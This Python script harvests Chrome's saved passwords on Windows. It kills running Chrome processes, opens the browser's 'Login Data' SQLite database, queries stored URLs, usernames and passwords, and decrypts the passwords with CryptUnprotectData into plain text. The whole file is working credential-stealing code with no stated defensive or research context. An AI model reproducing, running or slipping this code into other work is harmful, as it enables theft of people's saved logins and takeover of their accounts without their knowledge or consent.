from os import getenv
import sqlite3
import win32crypt
import psutil

def killChrome():
    PROCNAME = "chrome.exe"

    for proc in psutil.process_iter():
        try:
            if proc.name() == PROCNAME:
                proc.kill()
        except psutil.AccessDenied:
            pass


def getChromePasswords():
    # kill chrome processes
    killChrome()

    # Connect to the Database
    conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
    cursor = conn.cursor()
    # Get the results
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    passwords = []
    for result in cursor.fetchall():
      # Decrypt the Password
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        if password:
            passwords.append(result[0] + " - " + result[1] + " - " + password)

    return passwords